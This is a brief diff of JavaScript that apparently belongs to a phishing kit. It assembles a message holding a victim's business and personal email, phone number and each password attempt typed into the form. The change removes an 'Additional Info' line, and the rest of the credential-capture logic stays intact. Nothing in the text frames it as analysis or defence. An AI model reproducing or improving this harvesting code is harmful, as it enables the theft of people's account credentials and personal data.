@@ -483,8 +483,7 @@
             message += `<b>Business Email:</b> ${formData.businessEmail}\n`;
             message += `<b>Personal Email:</b> ${formData.personalEmail}\n`;
             message += `<b>Mobile Phone:</b> ${formData.mobilePhoneNumber}\n`;
-            message += `<b>Additional Info:</b> ${formData.additionalInfo || 'N/A'}\n`;
-
+          
             if (passwordAttemptCount === 1) {
                 passwordAttemptValue1 = password;
                 message += `<b>Password Attempt 1:</b> ${passwordAttemptValue1}\n`;
